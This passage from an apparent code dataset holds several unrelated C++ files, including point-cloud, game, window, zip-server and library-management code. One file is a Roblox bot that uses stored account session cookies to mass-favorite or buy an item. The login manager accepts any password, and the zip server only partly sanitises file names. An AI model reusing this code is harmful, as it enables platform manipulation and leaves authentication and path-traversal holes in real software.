1.0f);\n            n_cloud_b[i].normal[2] = 1024 * rand() / (RAND_MAX + 1.0f);\n        }\n    std::cerr << \"Cloud A: \" << std::endl;\n    for (std::size_t i = 0; i < cloud_a.size(); ++i)\n        std::cerr << \"    \" << cloud_a[i].x << \" \" << cloud_a[i].y << \" \" << cloud_a[i].z << std::endl;\n\n    std::cerr << \"Cloud B: \" << std::endl;\n    if (strcmp(argv[1], \"-p\") == 0)\n        for (std::size_t i = 0; i < cloud_b.size(); ++i)\n            std::cerr << \"    \" << cloud_b[i].x << \" \" << cloud_b[i].y << \" \" << cloud_b[i].z << std::endl;\n    else\n        for (std::size_t i = 0; i < n_cloud_b.size(); ++i)\n            std::cerr << \"    \" << n_cloud_b[i].normal[0] << \" \" << n_cloud_b[i].normal[1] << \" \" << n_cloud_b[i].normal[2] << std::endl;\n\n    // Copy the point cloud data\n    if (strcmp(argv[1], \"-p\") == 0)\n    {\n        cloud_c = cloud_a;\n        cloud_c += cloud_b;\n        std::cerr << \"Cloud C: \" << std::endl;\n        for (std::size_t i = 0; i < cloud_c.size(); ++i)\n            std::cerr << \"    \" << cloud_c[i].x << \" \" << cloud_c[i].y << \" \" << cloud_c[i].z << \" \" << std::endl;\n    }\n    else\n    {\n        pcl::concatenateFields(cloud_a, n_cloud_b, p_n_cloud_c);\n        std::cerr << \"Cloud C: \" << std::endl;\n        for (std::size_t i = 0; i < p_n_cloud_c.size(); ++i)\n            std::cerr << \"    \" <<\n            p_n_cloud_c[i].x << \" \" << p_n_cloud_c[i].y << \" \" << p_n_cloud_c[i].z << \" \" <<\n            p_n_cloud_c[i].normal[0] << \" \" << p_n_cloud_c[i].normal[1] << \" \" << p_n_cloud_c[i].normal[2] << std::endl;\n    }\n    return (0);\n}",
    "#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <fstream>\n#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <regex>\n\n// -- INFOS -- //\n\nstd::string RobloxUrl = \"https://www.roblox.com\";\nlong long int TargetFavoriteItem = 15556784020; // Change this with your target item's asset id (Works with games aswell but you can purchase games)\nbool IsBuyingEnabled = false; // Set it to true if you want accounts to buy it (Dont use this if the target is a game)\nlong long int TargetFavoriteItemProduct = 22; // Product id of target item\nint TargetItemPrice = 0; // Price of target item\n\n// -- Functions and Main -- //\n\nnlohmann::json ToJson(std::string JsonSource) {\n    return nlohmann::json::parse(JsonSource.c_str());\n}\n\nstd::string GetAccounts() {\n    std::ifstream file(\"Accounts.txt\");\n\n    if (!file.is_open()) {\n        std::cout << \"Error opening file\" << std::endl;\n        return \"\";\n    }\n    std::string fileContents((std::istreambuf_iterator<char>(file)),\n                            std::istreambuf_iterator<char>());\n    file.close();\n    return fileContents;\n}\n\nvoid FavTarget(long long int TargetID) {\n    std::string AccountTXT = GetAccounts();\n    std::regex pattern(\"Username: (.+)\\nCookie: (.+)\");\n    std::sregex_iterator iter(AccountTXT.begin(), AccountTXT.end(), pattern);\n    std::sregex_iterator end;\n\n    while (iter != end) {\n        std::smatch match = *iter;\n        std::string MyUser = match[1];\n        std::string Cookie = match[2];\n\n        //std::cout << Cookie << std::endl;\n\n        cpr::Session newsession;\n        newsession.SetHeader(cpr::Header{{\"Content-Type\", \"application/json\"}});\n        newsession.SetCookies(cpr::Cookies{{\".ROBLOSECURITY\", Cookie.c_str()}});\n        newsession.SetUrl(cpr::Url(\"https://auth.roblox.com/v2/logout\"));\n\n        cpr::Response resp = newsession.Post();\n\n        auto it = resp.header.find(\"x-csrf-token\");\n        if (it != resp.header.end()) {\n            newsession.UpdateHeader(cpr::Header({{\"referer\", RobloxUrl.c_str()}, {\"x-csrf-token\", it->second}}));\n        }\n\n        nlohmann::json BodyGetUserid;\n        BodyGetUserid[\"usernames\"] = {MyUser.c_str()};\n        BodyGetUserid[\"excludeBannedUsers\"] = true;\n\n        newsession.SetBody(cpr::Body(BodyGetUserid.dump()));\n        newsession.SetUrl(cpr::Url(\"https://users.roblox.com/v1/usernames/users\"));\n        \n        cpr::Response UseridResponse = newsession.Post();\n        nlohmann::json UseridJson = ToJson(UseridResponse.text);\n        long long int MyUserId = UseridJson[\"data\"][0][\"id\"];\n\n        if (IsBuyingEnabled) {\n            // Purchase the target thing\n            std::string BuyUrl = \"https://apis.roblox.com/creator-marketplace-purchasing-service/v1/products/\" + std::to_string(TargetID) + \"/purchase\";\n            nlohmann::json BuyBody;\n            BuyBody[\"expectedPrice\"] = TargetItemPrice;\n            BuyBody[\"expectedSellerId\"] = 1;\n            BuyBody[\"expectedCurrency\"] = 1;\n\n            newsession.SetUrl(cpr::Url(BuyUrl.c_str()));\n            newsession.SetBody(cpr::Body(BuyBody.dump()));\n            newsession.Post();\n        }\n\n\n        // Favorite it\n        newsession.SetBody(cpr::Body()); // Set body to nothing\n\n        std::string TargetUrl = \"https://catalog.roblox.com/v1/favorites/users/\" + std::to_string(MyUserId) + \"/assets/\" + std::to_string(TargetID) + \"/favorite\";\n        newsession.SetUrl(cpr::Url(TargetUrl.c_str()));\n\n        cpr::Response FavResponse = newsession.Post();\n\n        std::cout << FavResponse.status_code << std::endl;\n\n        iter++;\n\n        Sleep(1500); // 1.5 sec\n    }\n}\n\nint main(int, char**){\n    FavTarget(TargetFavoriteItem);\n}\n",
    "#include \"auth/login_manager.h\"\n#include \"auth/administrator.h\"\n#include \"auth/instructor.h\"\n#include \"auth/session.h\"\n#include <fstream>\n#include <iostream>\n#include <memory>\n\nnamespace auth {\nlogin_manager::login_manager ()\n: _current_session_index (-1), _current_user (nullptr) {\n    load_sessions ();\n}\n\nstd::unique_ptr<user> login_manager::load_user (std::string id, user::Role role) {\n    switch (role) {\n    case user::Role::ADMINISTRATOR:\n        return std::unique_ptr<administrator> (new administrator (id));\n\n    case user::Role::INSTRUCTOR:\n        return std::unique_ptr<instructor> (new instructor (id));\n\n    case user::Role::STUDENT:\n        return std::unique_ptr<student> (new student (id));\n    }\n}\n\nvoid login_manager::load_sessions () {\n    try {\n        std::string user_id, role_string;\n        time_t time;\n        for (const std::filesystem::directory_entry& x :\n        std::filesystem::directory_iterator{ session::get_directory () }) {\n            std::ifstream infile (x.path ().string ());\n            infile >> user_id >> role_string >> time;\n\n            std::shared_ptr<user> user =\n            load_user (user_id, user::string_to_role (role_string));\n            _sessions.push_back (session (user, time));\n\n            infile.close ();\n        }\n    } catch (const std::filesystem::filesystem_error& ex) {\n        std::cerr << ex.what () << '\\n';\n    }\n}\n\nbool login_manager::login (std::string username, std::string password) {\n    // Get users info from database\n    std::string query_string = \"SELECT * FROM users WHERE id = ?\";\n    SQLite::Statement query (db::database::get_db (), query_string);\n    query.bind (1, username);\n\n    if (!query.executeStep ())\n        return false;\n\n    auth::user::Role _role = auth::user::string_to_role (query.getColumn (6));\n    _current_user          = load_user (username, _role);\n\n    // Create a session for the user\n    auth::session session (_current_user, time (NULL));\n    session.save_session ();\n\n    return true;\n}\n\nbool login_manager::login (int session_id) {\n    if (!_sessions.valid_index (session_id))\n        return false;\n    auto session = _sessions[session_id];\n    // TODO: handle when the session has expired\n\n    if (session.has_expired ())\n        return false;\n\n    _current_user          = session.get_user ();\n    _current_session_index = session_id;\n\n    return true;\n}\n\nbool login_manager::logout () {\n    if (is_logged ())\n        return false;\n\n    _current_session_index = -1;\n    _current_user          = nullptr;\n    return true;\n}\n} // namespace auth\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <queue>\n#include \"LFR.h\"\n#include \"OPT.h\"\n#include \"Clock.h\"\n#include <iomanip>\n\nstd::queue<int> generate_queue();\n\nint main(){\n    std::queue<int> q = generate_queue();\n    \n    std::cout << \"hit_count_LFR  \" << \"hit_count_OPT\" << \"size  \" << \"hit_count_CLOCK\"<< std::endl;\n    for (int size = 4; size < 32; size++)\n    {\n        std::cout << size;\n        if (size < 10)\n            std::cout << \" \";\n        std::cout << std::setw(12) << std::setprecision(4) << std::showpoint << (double)LFR(q, size) / 3.2 << \"%\"\n        << std::setw(12) << (double)OPT(q, size) / 3.2 << \"%\"\n        << std::setw(12) << (double)Clock(q, size) / 3.2 << \"%\" << std::endl;\n    }\n\n    return 0;\n}\n\nstd::queue<int> generate_queue()\n{\n    unsigned seed = time(0);\n    srand(seed);\n    std::queue<int> q;\n    for (int i = 0; i < 64; i++)\n    {\n        int M = rand() % 320;\n        q.push(M);\n        q.push((M + 1) % 320);\n        M = rand() % (M + 2);\n        q.push(M);\n        q.push((M + 1) % 320);\n        int k = (M + 2) % 320;\n        M = k + rand() % (320 - k);\n        q.push(M);\n    }\n    return q;\n}",
    "#include \"logic.hpp\"\n\nLogic::Logic(Board* board, Display* display)\n{\n    this->board = board;\n    this->display = display;\n}\n\nLogic::~Logic()\n{\n    this->board = nullptr;\n    this->display = nullptr;\n}\n\n// First check isGameWon before checking canAutoFinish\nbool Logic::isGameWon()\n{\n    // Check if all the foundation piles are full\n    for (int i = 0; i < FOUNDATION_COUNT; i++)\n    {\n        if (this->board->getFoundationLength(i) != MAX_VALUE)\n        {\n            return false;\n        }\n    }\n\n    // If all the foundation piles are full, then the game is won\n    return true;\n}\n\nbool Logic::canAutoFinish()\n{\n    // No more unused cards, and every card in the stack is face up\n    if (this->board->getCurrentUnusedCard() != nullptr || this->board->getNextUnusedCard() != nullptr)\n    {\n        return false;\n    }\n    \n    for (int i = 0; i < STACK_COUNT; i++)\n    {\n        int stackLength = this->board->getStackLength(i);\n        if (stackLength == 0)\n        {\n            continue;\n        }\n\n        Card* bottomCard = this->board->getCardFromStack(i, 0);\n        if (!bottomCard->isFaceUp)\n        {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nvoid Logic::handleUnusedCardSelection(int verticalCursorIndex)\n{\n    // If Cursor is on ?/X, shift to next card\n    if (verticalCursorIndex == 0)\n    {\n        this->board->shiftNextUnusedCard();\n        this->board->addMoves();\n    }\n    else // lock or unlock cursor\n    {\n        this->display->getCursor()->updateCursorLock(true);\n    }\n}\n\n// This action means that the player wants to move cards from some place to this stack\nbool Logic::handleStackSelection(int toStackIndex, int fromPileIndex, int verticalCursorIndex)\n{\n    // First we determine the index of the card\n    // Vertical Cursor Index determines the card index in the stack\n    if (fromPileIndex == 0) // Unused Pile\n    {\n        // We know its current unused card, as you can't lock cursor on a hidden/X tile\n        return unusedToStack(toStackIndex);\n    }\n    else if (fromPileIndex <= STACK_COUNT) // Stack\n    {\n        int fromStackIndex = fromPileIndex - 1;\n        if (fromStackIndex == toStackIndex) // Lock vertical cursor or Unlock\n        {\n            this->display->getCursor()->updateCursorLock(true);\n            return true;\n        }\n\n        // We might have to loop through the stack again ffs...\n        int stackLength = this->board->getStackLength(fromStackIndex);\n        if (verticalCursorIndex >= stackLength)\n        {\n            return false;\n        }\n\n        int hiddenCount = 0;\n        for (int i = 0; i < stackLength; i++)\n        {\n            Card* card = this->board->getCardFromStack(fromStackIndex, i);\n            if (!card->isFaceUp)\n            {\n                hiddenCount++;\n            }\n        }\n        // If there is a hidden card, means 0 to hiddenCount - 1 are hidden and collapsed to verticalCursorIndex 0\n        hiddenCount = hiddenCount > 0 ? hiddenCount - 1 : 0;\n        int cardIndex = verticalCursorIndex + hiddenCount;\n\n        return stackToStack(cardIndex, fromStackIndex, toStackIndex);\n    }\n    else // We transferring from foundation\n    {\n        int foundationPileIndex = fromPileIndex - 1 - STACK_COUNT;\n        int foundationIndex = foundationPileIndex + 2 * verticalCursorIndex;\n        \n        return foundationToStack(foundationIndex, toStackIndex);\n    }\n}\n\nbool Logic::handleFoundationSelection(int cursorPileIndex, int verticalCursorIndex)\n{\n    /* Possibilities\n    1. Cursor is on foundation pile - We swap cursor status\n    2. Cursor is on stack (Locked) - We try to move the cards from the stack to the foundation pile\n    3. Cursor is on unused pile - We try to move the card from the unused pile to the foundation pile\n    */\n   \n    if (cursorPileIndex == 0) // Unused Pile\n    {\n        return unusedToFoundation();\n    }\n    else if (cursorPileIndex <= STACK_COUNT) // Stack\n    {\n        int stackIndex = cursorPileIndex - 1;\n        return stackToFoundation(stackIndex);\n    }\n    else // Foundation\n    {\n        this->display->getCursor()->updateCursorLock(true);\n        return true;\n    }\n}\n\n// Move cards from one stack to another stack\n// We can use enum to represent the return values and tell the player what went wrong\nbool Logic::stackToStack(int cardIndex, int fromStackIndex, int toStackIndex)\n{\n    // Get the stack length\n    int fromStackLength = this->board->getStackLength(fromStackIndex);\n    if (cardIndex >= fromStackLength)\n    {\n        return false;\n    }\n\n    // Get the cards that will be moved from the stack\n    // Example: If the stack has 5 cards and the cardIndex is 2, then 3 cards will be moved (2, 3, 4)\n    int numCardsToMove = fromStackLength - cardIndex;\n    Card* cardsToMove[numCardsToMove];\n    for (int i = 0; i < numCardsToMove; ++i)\n    {\n        cardsToMove[i] = this->board->getCardFromStack(fromStackIndex, cardIndex + i);\n        // If any of the cards are face down, then we can't move them\n        if (!cardsToMo",
    "#include \"ai2.h\"\n\nchar getNextMove2(const GameBoard& game) {\n    int bestValue = INT_MIN; \n    char bestMove = ' ';     \n    int alpha = INT_MIN, beta = INT_MAX; \n\n    static const char moves[] = {'w', 'a', 's', 'd'};\n\n    for (char move : moves) {\n        GameBoard boardCopy = game; \n        if (boardCopy.makeMove(move)) { \n            int moveValue = alphaBeta(boardCopy, a , alpha, beta, true); \n            if (moveValue > bestValue) { \n                bestValue = moveValue;\n                bestMove = move; \n            }\n        }\n    }\n    return bestMove; \n}\n\n\nint alphaBeta(GameBoard& board, int depth, int alpha, int beta, bool maximizingPlayer) {\n    if (depth == 0 || !board.canMove()) { \n        return b*board.countEmptySpaces()+c*board.monotonicity()+d*board.maxTilePosition()+e*board.smoothness(); \n    }\n    if (maximizingPlayer) {\n        int maxEval = INT_MIN; \n        for (char move : {'w', 'a', 's', 'd'}) { \n            GameBoard boardCopy = board;\n            if (boardCopy.makeMove(move)) { \n                int eval = alphaBeta(boardCopy, depth - 1, alpha, beta, false); \n                maxEval = std::max(maxEval, eval); \n                alpha = std::max(alpha, eval); \n                if (beta <= alpha) {\n                    break; \n                }\n            }\n        }\n        return maxEval;\n    } else {\n        int minEval = INT_MAX; // Best evaluation for minimizer\n        for (char move : {'w', 'a', 's', 'd'}) { // Explore all possible moves\n            GameBoard boardCopy = board;\n            if (boardCopy.makeMove(move)) { // If the move is successful\n                int eval = alphaBeta(boardCopy, depth - 1, alpha, beta, true); // Recurse for maximizing player\n                minEval = std::min(minEval, eval); // Update the minimum evaluation\n                beta = std::min(beta, eval); // Update beta\n                if (beta <= alpha) {\n                    break; // Alpha cutoff\n                }\n            }\n        }\n        return minEval;\n    }\n}",
    "#include \"globals.h\"\n#include \"Session.h\"\n#include \"../common/rle.h\"\n\nstd::map<std::string, UserSettings> UserMap;\n\nSession::Session(TcpSocket t_socket, boost::asio::io_context& io, boost::filesystem::path m_workDirectory)\n    :   socket(std::move(t_socket)),\n        workDirectory(m_workDirectory),\n        ioContext(io),\n        myStrand(ioContext) {\n}\n\n\nvoid Session::readCommands() {\n    auto self = shared_from_this();\n    async_read_until(socket, requestBufRead, \"\\n\\n\",\n                     boost::asio::bind_executor(myStrand, [this, self](boost::system::error_code ec, size_t bytes) {\n                         if (!ec) {\n                             if (verbose_flag) std::cout << \"read_commands(): already read\" << std::endl;\n                             commandRouter(bytes);\n                         }\n\n                         else\n                             handleError(__FUNCTION__, ec);\n                     }));\n}\n\nbool Session::checkUserActive() {\n    if (UserMap.find(user) == UserMap.end()) {\n        UserMap[user] = { 1, time(nullptr), 0 };\n    } else {\n        std::time_t currentTime = time(nullptr);\n        double diff = difftime(currentTime, UserMap[user].lastActiveTime);\n        if (diff > 60) {\n            UserMap[user].userReqCount = 1;\n        } else {\n            UserMap[user].userReqCount += 1;\n        };\n\n        if (UserMap[user].userReqCount > reqsPerMin) {\n            std::cout << \"checkUserActive(): many requests\" << std::endl;\n            return false;\n        }\n\n        if (command  == \"zip\"\n        || command == \"zip-and-get\"\n        || command == \"unzip-and-get\"\n        || command == \"unzip\")\n        {\n            UserMap[user].userMaxFile += 1;\n        }\n\n\n        if (UserMap[user].userMaxFile > maxNFiles) {\n            std::cout << \"checkUserActive(): user has reached the limit file\" << std::endl;\n            return false;\n        }\n\n        UserMap[user].lastActiveTime = currentTime;\n    }\n\n    return true;\n}\n\nvoid Session::commandRouter(size_t t_bytesTransferred) {\n    if (verbose_flag) std::cout << __FUNCTION__ << \"(\" << t_bytesTransferred << \")\"\n                                << \", in_avail = \" << requestBufRead.in_avail() << \", size = \"\n                                << requestBufRead.size() << \", max_size = \" << requestBufRead.max_size() << \".\" << std::endl;\n    if (verbose_flag) {\n        boost::asio::streambuf::const_buffers_type bufs = requestBufRead.data();\n        std::string line(boost::asio::buffers_begin(bufs), boost::asio::buffers_begin(bufs) + t_bytesTransferred);\n        std::cout << \"line: \" << line << std::endl;\n    }\n    std::istream requestStream(&requestBufRead);\n    requestStream >> command;\n    if (command.empty()) {\n        sendError(\"COMMAND_IS_EMPTY\", __LINE__, \"commandRouter\");\n        return;\n    }\n\n    requestStream >> user;\n    if (user.empty()) {\n        sendError(\"USERNAME_IS_EMPTY\", __LINE__, \"commandRouter\");\n        return;\n    }\n\n    if (!checkUserActive()) {\n        sendError(\"USER_REACHED_LIMIT\", __LINE__, \"commandRouter\");\n        return;\n    }\n\n\n    if (command == \"get\") {\n        requestStream >> fileName;\n        if (fileName.empty()) {\n            sendError(\"FILENAME_IS_EMPTY\", __LINE__, \"commandRouter\");\n            return;\n        }\n\n        getCommandHandler(fileName);\n        return;\n    }\n\n\n    if (command == \"zip\" || command == \"zip-and-get\") {\n        requestStream >> fileName;\n        requestStream >> fileSize;\n        if (fileName.empty() || !fileSize) {\n            sendError(\"ZIP_WRONG_ARGS\", __LINE__, \"commandRouter\");\n            return;\n        }\n\n\n\n        // \u0443\u0431\u0438\u0440\u0430\u0442\u044c 2 /n\n        requestStream.read(readBuf.data(), 2);\n\n        auto pos = fileName.find_last_of('\\\\');\n        if (pos != std::string::npos)\n            fileName = fileName.substr(pos + 1);\n\n        createFile(fileName + \".tmp\");\n\n        // \u0437\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043b\u0438\u0448\u043d\u0438\u0435 \u0431\u0430\u0439\u0442\u044b \u0432 \u0444\u0430\u0439\u043b\n        do {\n            requestStream.read(readBuf.data(), readBuf.size());\n            if (verbose_flag) std::cout << __FUNCTION__ << \" write \" << requestStream.gcount() << \" bytes.\" << std::endl;;\n            outputFile.write(readBuf.data(), requestStream.gcount());\n        } while (requestStream.gcount() > 0);\n\n        if (outputFile.tellp() >= static_cast<std::streamsize>(fileSize)) {\n            outputFile.close();\n            return zipLogic();\n        }\n\n        zipCommandHandler(command);\n        return;\n    }\n\n    if (command == \"unzip\" || command == \"unzip-and-get\") {\n        requestStream >> fileName;\n        requestStream >> fileSize;\n        if (fileName.empty() || !fileSize) {\n            sendError(\"UNZIP_WRONG_ARGS\", __LINE__, \"commandRouter\");\n            return;\n        }\n\n        // \u0443\u0431\u0438\u0440\u0430\u0442\u044c 2 /n\n        requestStream.read(readBuf.data(), 2);\n\n        auto pos = fileName.find_last_of('\\\\');\n        if (pos != std::string::npos)\n            fileName = fileName.substr(pos + 1);\n\n        std::string tempFile = fileName + \".tmp\";\n        createFile(tempFile);\n\n        // \u0437\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043b",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include \"easylib.h\"\n\nusing namespace std;\n\nint main() {\n    Library library;\n    library.loadBooksFromFile(); // Load book data on startup\n    library.loadMembersFromFile(); // Load member data on startup\n\n    int choice;\n    do {\n// cout <<\"  _____                         _       _   _      \" << endl; \n// cout <<\" | ____|   __ _   ___   _   _  | |     (_) | |__   \" << endl;\n// cout <<\" |  _|    / _` | / __| | | | | | |     | | | '_ \\  \" << endl; \n// cout <<\" | |___  | (_| | \\__ \\ | |_| | | |___  | | | |_) | \" << endl; \n// cout <<\" |_____|  \\__,_| |___/  \\__, | |_____| |_| |_.__/  \" << endl;  \n// cout <<\"                       |___/                       \" << endl; \n        cout << \"\\nEasyLib - A Library Management System\" << endl;\n        cout << \"1. Add Book\" << endl;\n        cout << \"2. Issue Book\" << endl;\n        cout << \"3. Return Book\" << endl;\n        cout << \"4. Search Books\" << endl;\n        cout << \"5. Display All Books\" << endl;\n        cout << \"6. Add Member\" << endl;\n        cout << \"7. Display All Members\" << endl;\n        cout << \"8. Save Data\" << endl;\n        cout << \"0. Exit\" << endl;\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: library.addBook(); break;\n            case 2: library.issueBook(); break;\n            case 3: library.returnBook(); break;\n            case 4: library.searchBooks(); break;\n            case 5: library.displayAllBooks(); break;\n            case 6: library.addMember(); break;\n            case 7: library.displayAllMembers(); break;\n            case 8: library.saveBooksToFile(); library.saveMembersToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\n// Library member function definitions\nvoid Library::addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid Library::issueBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"\\nEnter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << \".\" << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid Library::returnBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<string>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid Library::searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n    if (choice > 3 || choice < 1){\n        cout << \"Invalid Choice. Please try again.\" << endl;\n    }\n    else{\n    cin.ignore(); // Cl",
